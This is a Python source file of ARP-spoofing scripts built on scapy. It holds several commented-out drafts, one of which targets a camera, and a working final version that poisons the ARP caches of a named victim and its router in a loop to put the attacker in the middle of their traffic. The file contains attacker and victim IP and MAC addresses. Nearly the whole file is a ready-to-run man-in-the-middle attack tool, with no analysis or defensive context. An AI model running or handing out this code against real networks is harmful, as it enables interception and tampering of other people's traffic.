
import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP, getmacbyip

# macAttacker = '20:1E:88:95:8D:05'
# ipAttacker = '192.168.88.112'
# macVictim = '30:4a:26:de:80:24'
# ipVictim = '192.168.88.123'
# ipToSpoof = '192.168.88.1'

# macAttacker = '20:1E:88:95:8D:05'
# ipAttacker = '192.168.0.101'
# macVictim = '3C:1E:B5:11:DE:FD'
# ipVictim = '192.168.0.100'
# ipToSpoof = '192.168.0.1'


# arp = Ether() / ARP()
# arp[Ether].src = macAttacker  # Set the source MAC address to the attacker's MAC
# arp[ARP].hwsrc = macAttacker  # Set the ARP sender hardware address to the attacker's MAC
# arp[ARP].psrc = ipToSpoof    # Set the ARP sender protocol address to the IP to spoof
# arp[ARP].hwdst = macVictim    # Set the ARP target hardware address to the victim's MAC
# arp[ARP].pdst = ipVictim      # Set the ARP target protocol address to the victim's IP
#
# #kuzey
#
# while True:
#     sendp(arp, iface="Wi-Fi")
#     time.sleep(2)
import time

# interval = 4
# ip_target = input("Enter target IP address: ")
# ip_gateway = input("Enter gateway IP address: ")
#
#
# def spoof(target_ip, spoof_ip):
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
#     scapy.send(packet, verbose=False)
#
#
# def restore(destination_ip, source_ip):
#     destination_mac = scapy.getmacbyip(destination_ip)
#     source_mac = scapy.getmacbyip(source_ip)
#     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
#     scapy.send(packet, verbose=False)
#
#
# try:
#     while True:
#         spoof(ip_target, ip_gateway)
#         spoof(ip_gateway, ip_target)
#         time.sleep(interval)
# except KeyboardInterrupt:
#     restore(ip_gateway, ip_target)
#     restore(ip_target, ip_gateway)




#
# import scapy.all as scapy
# import time
#
# interval = 4
# ip_target = input("Enter target IP address: ")
# ip_gateway = input("Enter gateway IP address: ")
#
# def spoof(target_ip, spoof_ip):
#     target_mac = scapy.getmacbyip(target_ip)
#     if not target_mac:
#         print(f"Could not find MAC address for {target_ip}")
#         return
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#     scapy.send(packet, verbose=False)
#     print(f"Sent to {target_ip}: {spoof_ip} is-at {target_mac}")
#
# def restore(destination_ip, source_ip):
#     destination_mac = scapy.getmacbyip(destination_ip)
#     source_mac = scapy.getmacbyip(source_ip)
#     if not destination_mac or not source_mac:
#         print(f"Could not find MAC address for {destination_ip} or {source_ip}")
#         return
#     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
#     scapy.send(packet, verbose=False)
#     print(f"Restored {destination_ip} to correct ARP mapping.")
#
# try:
#     print("Starting ARP spoofing. Press Ctrl+C to stop.")
#     while True:
#         spoof(ip_target, ip_gateway)  # Spoof the camera, making it think the attacker is the router
#         spoof(ip_gateway, ip_target)  # Spoof the router, making it think the attacker is the camera
#         time.sleep(interval)
# except KeyboardInterrupt:
#     print("\nDetected Ctrl+C! Restoring ARP tables...")
#     restore(ip_gateway, ip_target)
#     restore(ip_target, ip_gateway)
#     print("ARP tables restored.")
#


import sys
import logging
import time
import signal
from scapy.all import*

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Send malicious ARP packets
def send_packet(my_mac, gateway_ip, target_ip, target_mac):
    packet = Ether(src=my_mac, dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, hwsrc=my_mac, pdst=target_ip, hwdst=target_mac
    )
    sendp(packet, verbose=False)

# Restore the ARP table
def restore_arp(dest_ip, dest_mac, source_ip, source_mac):
    packet = Ether(src=source_mac, dst=dest_mac) / ARP(
        op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac
    )
    sendp(packet, verbose=False)

def exit_gracefully(sig, frame):
    print("\n[!] Restoring ARP tables....")
    restore_arp(router_ip, router_mac, victim_ip, victim_mac)
    restore_arp(victim_ip, victim_mac, router_ip, router_mac)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_gracefully)

def main():
    if len(sys.argv) != 3:
        print("\n[!] Usage: sudo python3 spoof.py <VICTIM_IP> <ROUTER_IP>")
        sys.exit(1)

    global victim_ip, router_ip, victim_mac, router_mac, my_mac
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    my_mac = get_if_hwaddr(conf.iface)

    if not victim_mac or not router_mac:
        print("[!] Could not find MAC address. Exiting...")
        sys.exit(1)

    print("[!] Sending spoofed ARP packets....")

    try:
        while True:
            send_packet(my_mac, router_ip, victim_ip, victim_mac)
            send_packet(my_mac, victim_ip, router_ip, router_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(router_ip, router_mac, victim_ip, victim_mac)
        restore_arp(victim_ip, victim_mac, router_ip, router_mac)
        print("\n[!] ARP tables restored.")
        sys.exit(0)

if __name__ == "__main__":
    main()